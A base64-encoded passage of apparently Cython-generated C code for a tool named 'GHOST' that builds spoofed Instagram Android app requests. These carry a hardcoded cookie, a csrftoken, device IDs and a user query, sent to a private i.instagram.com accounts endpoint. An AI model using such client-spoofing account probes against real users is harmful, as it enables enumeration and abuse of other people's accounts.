XJncywgX19weXhfa3dkc19sZW4sICJyZXN0IiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInJlc3QiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDIyMiwgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDIpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyMjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpO1xuICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMjIyLCBfX3B5eF9MM19lcnJvcilcbiAgICB9XG4gICAgX19weXhfdl9zZWxmID0gdmFsdWVzWzBdO1xuICAgIF9fcHl4X3ZfdXNlciA9IHZhbHVlc1sxXTtcbiAgfVxuICBnb3RvIF9fcHl4X0w2X3NraXA7XG4gIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjtcbiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInJlc3QiLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAyMjIsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QucmVzdCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJ0dF81R0hPU1RfMTZyZXN0KF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZiwgX19weXhfdl91c2VyKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0XzVHSE9TVF8xNnJlc3QoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBQeU9iamVjdCAqX19weXhfdl91c2VyKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9yID0gTlVMTDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzk7XG4gIGludCBfX3B5eF90XzEwO1xuICBpbnQgX19weXhfdF8xMTtcbiAgY2hhciBjb25zdCAqX19weXhfdF8xMjtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE1ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE4ID0gTlVMTDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicmVzdCIsIDApO1xuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzMpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDE4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX1BpZ2Vvbl9TZXNzaW9uX0lkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzUwY2M2ODYxXzcwMzZfNDNiNF84MDJlX2ZiNDI4Mjc5KSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfUGlnZW9uX1Jhd2NsaWVudHRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMTcwMDI1MTU3NF85ODIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19Db25uZWN0aW9uX1NwZWVkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzFrYnBzKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQmFuZHdpZHRoX1NwZWVkX0tCUFMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMV8wMDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19CYW5kd2lkdGhfVG90YWxCeXRlc19CLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19CYW5kd2lkdGhfVG90YWxUaW1lX01TLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9CbG9rc19WZXJzaW9uX0lkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYzgwYzVmYjMwZGZhZTllMjczZTQwMDlmMDNiMTgyODApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19Db25uZWN0aW9uX1R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9XSUZJKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQ2FwYWJpbGl0aWVzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzNiclR2dykgPCAoMCkpIF9fUFlYX0VSUigwLCAyMjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0FwcF9JRCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV81NjcwNjczNDMzNTI0MjcpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVXNlcl9BZ2VudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9JbnN0YWdyYW1fMTAwXzBfMF8xN18xMjlfQW5kcm9pZCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9BY2NlcHRfTGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fR0JfZW5fVVMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db29raWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfbWlkX1pWZkd2Z0FCQUFHb1FxYTdBWTNtZ29ZQlYxblApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQ29udGVudF9UeXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlXzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQWNjZXB0X0VuY29kaW5nLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2d6aXBfZGVmbGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0hvc3QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaV9pbnN0YWdyYW1fY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfRkJfSFRUUF9FbmdpbmUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9MaWdlcikgPCAoMCkpIF9fUFlYX0VSUigwLCAyMjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvbm5lY3Rpb24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfa2VlcF9hbGl2ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19weXhfdl9oZWFkZXJzID0gKChQeU9iamVjdCopX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNDUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF82ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZHVtcHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAyNDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI0NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jc3JmdG9rZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmopIDwgKDApKSBfX1BZWF9FUlIoMCwgMjQ3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hZGlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzBkZmFmODIwXzI3NDhfNDYzNF85MzY1X2MzZDhjODAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI0NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xZjc4NDQzMV8yNjYzXzRkYjlfYjYyNF84NmJkOWNlMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RldmljZV9pZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hbmRyb2lkX2I5M2RkYjM3ZTk4MzQ4MWMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjQ3LCBfX3B5eF9MM19lcnJvcilcblxuICAgICAgXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcXVlcnksIF9fcHl4X3ZfdXNlcikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzgpKSkge1xuICAgICAgICBfX3B5eF90XzYgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzgpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF82KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF84LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzkgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X3RfN307XG4gICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF84LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF84ID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDAsIF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDI0NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NpZ25lZF9ib2R5LCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjQ1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnX3NpZ19rZXlfdmVyc2lvbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDI0NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpO1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzggPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI1NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI1NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOSA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHtcbiAgICAgICAgX19weXhfdF84ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTtcbiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfOCk7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgIH1cbiAgICAgICNlbmRpZlxuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMyA6IDApXSA9IHtfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfaV9pbnN0YWdyYW1fY29tX2FwaV92MV9hY2N9O1xuICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyNTUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZWFkZXJzLCBfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfdl9kYXRhLCBfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZW91dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwLCBfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzKzIsIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKChQeU9iamVjdCopX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNTUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90XzQ7XG4gICAgICBfX3B5eF90XzQgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X3ZfcmVzcG9uc2U7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTtcbiAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uL